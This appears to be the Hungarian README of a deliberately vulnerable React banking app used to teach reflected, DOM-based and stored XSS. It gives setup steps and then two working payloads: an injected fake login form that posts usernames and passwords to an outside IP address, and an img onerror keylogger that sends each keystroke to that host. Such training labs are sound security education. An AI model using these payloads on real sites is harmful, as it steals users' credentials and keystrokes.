# React XSS Bank

Ez az alkalmazás háromféle XSS sebezhetőséget demonstrál:
- **Reflected XSS:** A keresőoldalon a felhasználó URL paraméterét a `dangerouslySetInnerHTML` segítségével jelenítjük meg.
- **DOM-based XSS:** A befektetési alapok oldalon a böngésző URL hash részét olvassuk be, és közvetlenül a DOM-ba illesztjük be.
- **Stored XSS:** Az ügyfélüzenetek (feedback) oldalon a felhasználók által beküldött üzeneteket (amelyek tárolva vannak a localStorage-ban) jelenítjük meg a `dangerouslySetInnerHTML` használatával.

## Futtatás

1. Node.js telepítése
2. git clone
3. cd react-xss-bank
4. npm install
5. npm start


<code><form action="http://172.18.193.203" method="post"> 
<label for="username">Felhasználó:</label><br> 
<input type="text" id="username" name="username"><br><br> 
<label for="password">Jelszó:</label><br> 
<input type="password" id="password" name="password"><br><br> <input type="submit" value="Belépés"> 
</form></form>code>

<img src=x onerror="(() => {
  document.onkeypress = function(e) {
          var k = e.key || String.fromCharCode(e.which || e.keyCode);
          var x = new XMLHttpRequest();
          x.open('GET', 'http://172.18.193.203:81/keystrokes?key=' + encodeURIComponent(k), true);
          x.send();
        };
})()">


